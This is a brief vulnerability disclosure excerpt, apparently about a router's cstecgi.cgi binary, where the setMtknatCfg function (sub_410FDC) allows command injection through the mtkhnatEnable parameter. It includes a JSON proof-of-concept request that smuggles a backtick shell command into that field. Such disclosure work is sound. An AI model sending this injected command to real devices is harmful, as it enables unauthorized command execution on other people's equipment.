...
The vulnerability is located in the function `sub_410FDC` within `cstecgi.cgi`, also known as `setMtknatCfg`.

![](Pasted%20image%2020231129171340.png)
...
therefore , by controlling parameter `mtkhnatEnable` , we can finally make an arbitrary command execution
...
{"mtkhnatEnable":"`id > /1.txt;`","topicurl":"setMtknatCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231129171257.png)